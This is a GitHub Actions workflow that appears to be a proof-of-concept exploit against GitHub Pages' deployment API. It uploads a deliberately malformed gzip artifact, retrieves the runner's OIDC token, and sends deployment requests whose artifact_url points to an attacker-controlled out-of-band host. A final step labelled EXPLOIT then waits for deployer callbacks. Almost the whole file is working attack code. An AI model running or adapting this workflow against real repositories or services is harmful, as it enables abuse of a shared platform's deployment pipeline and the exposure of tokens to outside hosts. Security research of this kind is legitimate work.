name: bf45-malformed-pages
on:
  workflow_dispatch:
    inputs:
      oob: { required: true }
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  capture:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - name: create-malformed-site
        run: |
          # Create a directory that looks like a site but has GZIP content
          mkdir -p _site
          echo '<html>real</html>' | gzip > _site/index.html
          # The upload-pages-artifact action will tar this directory
          # The deployer will get a tar containing gzip files = can't serve them
          
      - uses: actions/upload-pages-artifact@v3
        with:
          path: _site
          
      - name: capture-arm
        env:
          OOB: ${{ inputs.oob }}
          GH_TOKEN: ${{ github.token }}
        run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                       "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$TOKEN"
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          
          # Get the artifact ID we just uploaded
          ART_ID=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | \
            jq -r '.artifacts[0].id')
          echo "Artifact ID: $ART_ID"
          
          # CONTROL: artifact_url only (no artifact_id)
          echo "===== CONTROL (expect 400) ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_url\":\"https://$OOB/bf45/control\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          
          sleep 5
          
          # EXPLOIT: malformed Pages artifact + attacker URL
          echo "===== EXPLOIT: malformed artifact $ART_ID + attacker URL ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":$ART_ID,\"artifact_url\":\"https://$OOB/bf45/exploit?arm=MALFORMED\",\"pages_build_version\":\"${GITHUB_SHA}-exploit\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          
          echo "===== Waiting 120s for deployer callbacks ====="
          for i in $(seq 1 8); do sleep 15; echo "t=$((i*15))s"; done
